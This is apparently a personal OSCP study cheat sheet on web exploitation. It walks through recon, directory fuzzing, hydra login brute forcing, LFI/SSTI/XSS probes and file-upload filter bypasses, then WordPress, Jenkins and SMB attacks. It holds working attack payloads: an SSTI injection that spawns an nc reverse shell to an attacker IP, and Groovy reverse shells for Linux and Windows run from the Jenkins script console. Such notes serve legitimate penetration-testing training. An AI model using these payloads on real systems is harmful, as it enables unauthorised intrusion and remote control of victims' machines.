# Web Exploitation â€“ OSCP Markdown
Goal: Gain initial foothold (RCE, credentials, [reverse-]shell)

## Step 1 - Recon & Fingerprinting
Goal: Get technology + possible attacking area
```
whatweb http://<TARGET_IP>
```

In Browser (F12): 
- `wappalyzer`
- DevTools -> Network/Sources/Cookies
- Analyze JavaScript files
- Identify parameters / hidden endpoints

## Step 2 - Content Discovery
```
ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -e .php,.txt,.bak
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php,txt,bak,html
```

Nikto can make more damage than help. Too much noise and takes up time. Always try to make it manualy first
```
nikto -h http://<TARGET_IP>
```
**Mostly for low-hanging fruit, misconfigs, backup files**

## Step 2.5 - Quick Check
- /backup /old /test
- config files
- file upload forms
- admin panels

## Step 3 - Authentication Checks
- Login flows
- Weak password policies
- Session management review
- Cookie flags:
    + HttpOnly
    + Secure
    + SameSite

### Bruteforce Login Sites
Bruteforce only if:
- default creds fail
- no rate limiting
- high confidence (admin panel)

first try to get the post method and their payload. You can use `burpsuite` for this. you can then either bruteforce with burpsuite and a worldlist or use `hydra`.

in this cenario you wanna use `hydra`. Here are some examples:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/admin:username=^USER^&password=^PASS^&csrf=static_or_blank:F=Incorrect credentials"
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
```
- `-V`: full detailed output

## Step 4 - Parameter Testing
- LFI/RFI indicators
- SSTI indicators
- SQLi enumeration techniques
- XSS (Reflected / Stored / DOM)

```
?page=../../../../etc/passwd
?id=1'
{{7*7}}
<script>alert(1)</script>
```

**Workflow:**
- LFI -> RCE
- Upload -> RCE/RevShell
- Auth Bypass -> Cred Reuse
- XSS

### STTI
Test with:
```
{{7*7}}
```

Exploit site with:
```
${{<%[%'\"}}%\\
```

RCE reverse shell:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <KALI_IP> PORT >/tmp/f').read() }}
```

## Step 5 - File Upload Exploitation
Goal: Webshell / Reverse Shell

Check:
- Client-side vs server-side checks
- MIME Type
- Allowed extensions
- Upload location discovery

Typically Bypasses:
```
shell.php.jpg
shell.phtml
shell.php%00.jpg
```

Always test:
- upload -> direct execution
- upload -> include via LFI

## Step 6 - CMS Exploitation
### Wordpress
`wpscan`
```
wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt  --max-threads 20
```

After Login:
- Theme Editor -> PHP Reverse Shell
- Plugin Upload
- wp-config.php -> DB credentials

### Joomla
- `/administrator`
- version check
- default credentials
- file upload in templates -> Reverse Shell

### Drupla
- `/user/login`
- version check
- `Drupalgeddon`

## Step 7 - Jenkins
### Enumeration
often intern Network with Docker

[port forwarding](./PivotingTunneling.md#step-3b---port-forwarding)

### Login:
- default user: `admin`
- bruteforce with `hydra`

### Groovy Console -> RCE
```
Manage Jenkins -> Script Console
```

Linux Reverse Shell (Groovy)
```
def cmd = ["/bin/bash","-c","bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"]
cmd.execute()
```

Windows Reverse Shell (Groovy)
```
String host="KALI_IP";
int port=PORT;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

**If Jenkins runs as root or has access to host filesystem -> full compromise possible through privesc**

## Step 8 - SMB Exploitation

### Enumeration
```
nmap -p- -sV -sC <TARGET_IP>
nmap -p- --min-rate 5000 -T4 -oN fastscan.txt <TARGET_IP>
nmap -sV -sC -p 49663,49666,49667 <TARGET_IP>
```
Maybe some high ports

```
enum4linux -a <TARGET_IP>
```

```
smbclient -L //<TARGET_IP>/ -N
smbclient -L //10.80.188.175/ -N
```
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.80.188.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Check access
```
smbclient //<TARGET_IP>/<SERVICE> -N
smbclient //10.80.188.175/nt4wrksv -N
```

Test the user
```
smbclient -U USER -L //<TARGET_IP>
smbclient -U Bob -L //10.80.188.175
```

Connect with user
```
smbclient //<TARGET_IP>/<SERVICE> -U USER
smbclient //10.80.188.175/nt4wrksv -U Bob
```

### Upload or Download
```
get FILE
```

```
put FILE
```

## :22 Webserver and :80 SSH
Portforwarding for proper useage in browser

via ssh:
```
ssh -p 80 -L 8080:<TARGET_IP>:22 user@10.81.183.192
```

via socat:
```
sudo socat TCP-LISTEN:8080,fork TCP:<TARGET_IP>:22
```

## OSCP Note
Web exploitation is mainly used to gain an initial foothold.
Always look for:
- credentials
- file upload
- RCE
- credential reuse (SSH / SMB / WinRM / FTP)
